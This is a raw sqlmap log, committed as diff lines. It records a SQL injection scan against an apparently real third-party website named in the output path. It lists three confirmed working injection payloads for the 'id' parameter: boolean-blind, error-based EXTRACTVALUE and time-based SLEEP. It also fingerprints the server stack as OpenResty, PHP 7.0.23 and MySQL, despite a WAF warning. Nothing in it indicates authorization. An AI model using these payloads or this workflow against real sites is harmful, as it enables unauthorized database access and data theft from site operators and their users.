+[*] starting @ 16:38:54 /2018-12-05/
+
+[16:38:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.97\lib\sqlmap\txt\user-agents.txt'
+[16:38:55] [INFO] resuming back-end DBMS 'mysql' 
+[16:38:55] [INFO] testing connection to the target URL
+[16:38:55] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25) AND 4650=4650 AND (2449=2449
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=25) AND EXTRACTVALUE(1840,CONCAT(0x5c,0x717a786b71,(SELECT (ELT(1840=1840,1))),0x7178767671)) AND (5924=5924
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=25) AND SLEEP(5) AND (4082=4082
+---
+[16:38:55] [INFO] the back-end DBMS is MySQL
+web application technology: OpenResty, PHP 7.0.23
+back-end DBMS: MySQL >= 5.1
+[16:38:55] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\xy.5971.com'
+
+[*] ending @ 16:38:55 /2018-12-05/
+
+
